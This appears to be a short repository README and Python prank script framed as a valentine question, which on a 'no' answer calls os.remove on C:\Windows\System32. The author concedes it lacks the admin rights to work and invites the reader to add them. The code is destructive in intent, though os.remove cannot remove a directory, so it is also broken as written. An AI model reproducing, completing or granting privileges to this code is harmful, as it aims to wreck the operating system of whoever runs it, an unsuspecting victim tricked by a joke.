# Delete-Windows-System-32
This command will delete your windows system if the question is not answered correct.

#This code doesnt actually delete anything because it doesn't have the admin permissions it needs to do so, so you can add it yourself# 


import os

question = input("Will you be my valentine? (yes or no):")
if question == "yes":
    print("Yay, I love you!")
elif question == "no":
    os.remove("C:\Windows\System32")
